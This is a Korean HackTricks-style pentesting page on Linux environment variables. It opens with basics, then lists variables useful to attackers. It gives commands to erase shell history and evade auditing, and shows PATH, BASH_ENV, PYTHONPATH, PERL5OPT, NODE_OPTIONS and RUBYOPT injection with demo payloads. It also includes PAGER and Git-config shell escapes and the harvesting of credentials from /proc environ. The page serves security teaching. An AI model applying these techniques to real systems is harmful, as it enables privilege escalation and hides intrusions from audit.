# Linux 환경 변수

{{#include ../../banners/hacktricks-training.md}}

## 전역 변수

전역 변수는 **자식 프로세스**에 상속됩니다.

현재 세션에 대한 전역 변수는 다음과 같이 생성할 수 있습니다:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
이 변수는 현재 세션과 해당 세션의 자식 프로세스에서 사용할 수 있습니다.

다음과 같이 변수를 **삭제**할 수 있습니다:
```bash
unset MYGLOBAL
```
## 로컬 변수

**로컬 변수**는 **현재 셸/스크립트**에서만 **액세스**할 수 있습니다.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## 현재 변수 목록
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ`의 내용은 **NUL로 구분되어** 있으므로 다음 변형이 일반적으로 읽기 더 쉽습니다:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
상속된 환경 내부에서 **credentials** 또는 **interesting service configuration**을 찾고 있다면 [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)도 확인하세요.

## 일반적인 변수

출처: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)

- **DISPLAY** – **X**에서 사용하는 디스플레이입니다. 이 변수는 일반적으로 **:0.0**으로 설정되며, 현재 컴퓨터의 첫 번째 디스플레이를 의미합니다.
- **EDITOR** – 사용자가 선호하는 텍스트 편집기입니다.
- **HISTFILESIZE** – history file에 포함되는 최대 줄 수입니다.
- **HISTSIZE** – 사용자가 세션을 종료할 때 history file에 추가되는 줄 수입니다.
- **HOME** – 홈 디렉터리입니다.
- **HOSTNAME** – 컴퓨터의 호스트 이름입니다.
- **LANG** – 현재 언어입니다.
- **MAIL** – 사용자의 mail spool 위치입니다. 일반적으로 **/var/spool/mail/USER**입니다.
- **MANPATH** – 매뉴얼 페이지를 검색할 디렉터리 목록입니다.
- **OSTYPE** – 운영 체제 유형입니다.
- **PS1** – bash의 기본 프롬프트입니다.
- **PATH** – 파일의 상대 경로 또는 절대 경로를 지정하지 않고 파일 이름만 지정하여 실행하려는 binary files가 포함된 모든 디렉터리의 경로를 저장합니다.
- **PWD** – 현재 작업 디렉터리입니다.
- **SHELL** – 현재 command shell의 경로입니다(예: **/bin/bash**).
- **TERM** – 현재 터미널 유형입니다(예: **xterm**).
- **TZ** – 시간대입니다.
- **USER** – 현재 사용자 이름입니다.

## hacking에 유용한 변수

모든 변수가 동일하게 유용한 것은 아닙니다. offensive 관점에서는 **search paths**, **startup files**, **dynamic linker behavior** 또는 **audit/logging**을 변경하는 변수의 우선순위를 높이세요.

### **HISTFILESIZE**

**이 변수의 값을 0으로 변경**하면 **세션을 종료할 때** **history file** (\~/.bash_history)이 **0줄로 잘립니다**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

이 **변수의 값을 0으로 변경**하면 명령어가 **메모리 내 history에 보관되지 않으며**, **history file**(\~/.bash_history)에 다시 기록되지 않습니다.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

**이 변수의 값이 `ignorespace` 또는 `ignoreboth`로 설정되어 있으면**, 앞에 추가 공백이 붙은 모든 command는 history에 저장되지 않습니다.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**history file**을 **`/dev/null`**로 지정하거나 완전히 unset하세요. 이는 history size만 변경하는 것보다 일반적으로 더 안정적입니다.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

프로세스는 여기에 선언된 **proxy**를 사용하여 **http 또는 https**를 통해 인터넷에 연결합니다.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: 이를 따르는 tools/protocols의 기본 proxy.
- `no_proxy`: 직접 연결해야 하는 대상의 우회 목록(hosts/domains/CIDRs).
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
도구에 따라 소문자 및 대문자 변형을 사용할 수 있습니다(`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

프로세스는 **이 env 변수들**에 지정된 인증서를 신뢰합니다. 이는 **`curl`**, **`git`**, Python HTTP 클라이언트 또는 package manager와 같은 도구가 공격자가 제어하는 CA를 신뢰하도록 만드는 데 유용합니다(예를 들어 interception proxy가 정상적인 것으로 보이게 만들 수 있습니다).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

권한이 높은 wrapper/script가 **absolute paths 없이** 명령을 실행하면, **공격자가 제어하는 PATH 내 첫 번째 디렉터리**가 우선 적용됩니다. 이는 `sudo`, cron jobs, shell wrappers 및 사용자 지정 SUID helpers에서 발생하는 여러 **PATH hijacks**의 기반이 되는 primitive입니다. `env_keep+=PATH`, 취약한 `secure_path` 또는 `tar`, `service`, `cp`, `python` 등을 이름만으로 호출하는 wrappers를 확인하세요.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
`PATH`를 악용하는 전체 privilege-escalation chain은 [Linux Privilege Escalation](linux-privilege-escalation/README.md)을 확인하세요.

### **HOME & XDG_CONFIG_HOME**

`HOME`은 단순한 디렉터리 참조만을 의미하지 않습니다. 많은 도구가 `$HOME` 또는 `$XDG_CONFIG_HOME`에서 **dotfiles**, **plugins**, **per-user configuration**을 자동으로 불러옵니다. 권한이 높은 workflow에서 이러한 값이 유지된다면 **config injection**이 binary hijacking보다 쉬울 수 있습니다.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
흥미로운 대상에는 `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, 그리고 `.terraformrc`와 같은 도구별 파일이 포함됩니다.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

이 변수들은 **dynamic linker**에 영향을 줍니다:

- `LD_PRELOAD`: 추가 shared object가 먼저 로드되도록 강제합니다.
- `LD_LIBRARY_PATH`: library search directory를 앞에 추가합니다.
- `LD_AUDIT`: library loading 및 symbol resolution을 관찰하는 auditor library를 로드합니다.

권한이 있는 command가 이러한 변수를 유지한다면 **hooking**, **instrumentation**, **privilege escalation**에 매우 유용합니다. **secure-execution** 모드(`AT_SECURE`, 예: setuid/setgid/capabilities)에서는 loader가 이러한 변수 대부분을 제거하거나 제한합니다. 그러나 초기 loader 단계에서 발생하는 parser bug는 여전히 큰 영향을 미칠 수 있습니다. 해당 단계가 target program보다 **먼저** 실행되기 때문입니다.
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`는 glibc의 초기 동작(예: allocator tunables)을 변경하며 exploit lab에서 매우 유용합니다. 또한 **dynamic loader가 이를 매우 이른 단계에서 파싱**하기 때문에 보안 관점에서도 중요합니다. 2023년의 **Looney Tunables** bug는 loader에서 파싱되는 단일 environment variable이 SUID 프로그램에 대한 **local privilege-escalation primitive**가 될 수 있다는 점을 다시 한번 보여 주었습니다.
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash**가 **non-interactively** 시작되면 대상 script를 실행하기 전에 `BASH_ENV`를 확인하고 해당 파일을 source합니다. Bash가 `sh`로 호출되거나 POSIX-style interactive mode로 실행되는 경우에는 `ENV`도 확인될 수 있습니다. 이는 environment가 attacker-controlled 상태일 때 shell wrapper를 code execution으로 전환하는 고전적인 방법입니다.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash 자체는 `-p`가 사용되지 않는 한 **real/effective IDs가 서로 다를 때** 이러한 startup files를 비활성화하므로, 정확한 동작은 wrapper가 shell을 호출하는 방식에 따라 달라집니다. `setuid()`/`setgid()`를 호출한 **후** Bash를 실행하는 privileged wrapper에 주의하세요. IDs가 다시 일치하면 Bash는 그렇지 않았다면 무시했을 `BASH_ENV`, `ENV` 및 관련 shell state를 신뢰할 수 있습니다.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

이러한 variables는 Python의 startup 방식을 변경합니다:

- `PYTHONPATH`: import search paths를 앞에 추가합니다.
- `PYTHONHOME`: standard library tree의 위치를 변경합니다.
- `PYTHONSTARTUP`: interactive prompt 전에 file을 실행합니다.
- `PYTHONINSPECT=1`: script가 종료된 후 interactive mode로 진입합니다.

이는 제어 가능한 environment를 사용해 Python을 호출하는 maintenance scripts, debuggers, shells 및 wrappers에 대해 유용합니다. `python -E` 및 `python -I`는 모든 `PYTHON*` variables를 무시합니다.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
최근 실제 사례로는 Ubuntu/Debian 시스템에서 발생한 2024년 **needrestart** LPE가 있습니다. root 소유 scanner가 `/proc/<PID>/environ`에서 권한이 없는 process의 `PYTHONPATH`를 복사한 다음 Python을 실행했습니다. 공개된 exploit은 공격자가 제어하는 경로에 `importlib/__init__.so`를 배치하여, helper에 하드 코딩된 script가 실행되는 것보다 먼저 Python이 자체 초기화 과정에서 공격자 코드를 실행하도록 했습니다.

### **PERL5OPT & PERL5LIB**

Perl에도 마찬가지로 유용한 startup variable이 있습니다.

- `PERL5LIB`: library directory를 앞에 추가합니다.
- `PERL5OPT`: 모든 `perl` command line에 있는 것처럼 switch를 주입합니다.

이를 통해 **automatic module loading**을 강제하거나 대상 script가 흥미로운 작업을 수행하기 전에 interpreter 동작을 변경할 수 있습니다. Perl은 **taint / setuid / setgid** context에서는 이러한 variable을 무시하지만, 일반적인 root 실행 wrapper, CI job, installer 및 custom sudoers rule에서는 여전히 매우 중요합니다.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS`는 환경을 상속하는 모든 `node` 프로세스에 **Node.js CLI flags**를 앞에 추가합니다. 따라서 최종적으로 Node를 실행하는 wrappers, CI jobs, Electron helpers, sudo rules를 대상으로 할 때 유용합니다. 공격 측면에서 가장 흥미로운 flags는 일반적으로 다음과 같습니다.

- `--require <file>`: 대상 스크립트보다 먼저 CommonJS 파일을 preload합니다.
- `--import <module>`: 대상 스크립트보다 먼저 ES module을 preload합니다.

Node는 `NODE_OPTIONS`에서 일부 위험한 flags를 거부하지만, `--require`와 `--import`는 명시적으로 허용되며 일반적인 command-line arguments보다 **먼저** 처리됩니다.
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
간접적으로 `NODE_OPTIONS`를 설정하는 remote gadget chain(예: prototype-pollution에서 RCE로 이어지는 경우)은 [이 다른 페이지](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)를 확인하세요.

### **RUBYLIB & RUBYOPT**

Ruby도 동일한 유형의 startup 악용을 제공합니다:

- `RUBYLIB`: Ruby의 load path 앞에 디렉터리를 추가합니다.
- `RUBYOPT`: 모든 `ruby` invocation에 `-r`과 같은 command-line option을 주입합니다.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024년 **needrestart** vulnerabilities는 이것이 단순한 lab trick이 아니라는 점을 보여주었습니다. `PYTHONPATH` abuse에 취약했던 동일한 root-owned helper가 attacker-controlled `RUBYLIB`으로 Ruby를 실행하도록 유도되어, attacker directory에서 `enc/encdb.so`를 로드하게 만들 수도 있었습니다.

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

일부 도구는 환경 변수에서 path를 읽기만 하는 것이 아니라 해당 값을 **shell**, **editor** 또는 **input preprocessor**에 전달합니다. 따라서 privileged wrapper가 `git`, `man`, `less` 또는 이와 유사한 text viewer를 실행할 때 다음 변수들이 특히 중요합니다.

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command를 선택합니다.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: editor command를 선택하며, arguments가 함께 사용되는 경우가 많습니다.
- `LESSOPEN`, `LESSCLOSE`: `less`가 파일을 열 때 실행되는 pre/post-processor를 정의합니다.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git은 또한 `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, `GIT_CONFIG_VALUE_<n>`을 통해 디스크에 접근하지 않고 **env-only config injection**을 지원합니다:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
From a post-exploitation 관점에서도, 상속된 환경에는 **credentials**, **proxy settings**, **service tokens** 또는 **cloud keys**가 포함되는 경우가 많다는 점을 기억하세요. `/proc/<PID>/environ` 및 `systemd` `Environment=` hunting에 대해서는 [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)을 확인하세요.

### PS1

프롬프트 표시 방식을 변경합니다.

[**예시**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: 예시](<../images/image (897).png>)

일반 사용자:

![PERL5OPT & PERL5LIB - PS1: 백그라운드에서 실행 중인 작업 1개, 2개 및 3개](<../images/image (740).png>)

백그라운드에서 실행 중인 작업 1개, 2개 및 3개:

![PERL5OPT & PERL5LIB - PS1: 백그라운드에서 실행 중인 작업 1개, 2개 및 3개](<../images/image (145).png>)

백그라운드 작업 1개, 중지된 작업 1개, 마지막 명령이 올바르게 완료되지 않음:

![PERL5OPT & PERL5LIB - PS1: 백그라운드 작업 1개, 중지된 작업 1개, 마지막 명령이 올바르게 완료되지 않음](<../images/image (715).png>)

## 참고 자료

- [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)

{{#include ../../banners/hacktricks-training.md}}
